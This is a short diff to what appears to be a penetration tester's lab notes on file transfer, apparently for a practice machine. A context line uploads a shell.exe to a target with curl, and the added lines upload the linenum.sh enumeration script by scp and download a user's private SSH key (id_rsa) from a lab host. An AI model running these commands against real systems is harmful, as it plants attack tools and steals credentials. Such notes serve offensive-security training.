@@ -17,7 +17,10 @@ curl -T '/home/kali/Documents/pg/Hutch/shell.exe' 'http://192.168.136.122/' -u f
 ## SCP
 
 ```bash
+#upload
 scp linenum.sh user@remotehost:/tmp/linenum.sh # with ssh user creds
+# download
+scp user@10.10.80.41:/home/user/id_rsa .
 ```
 
 ## Base64
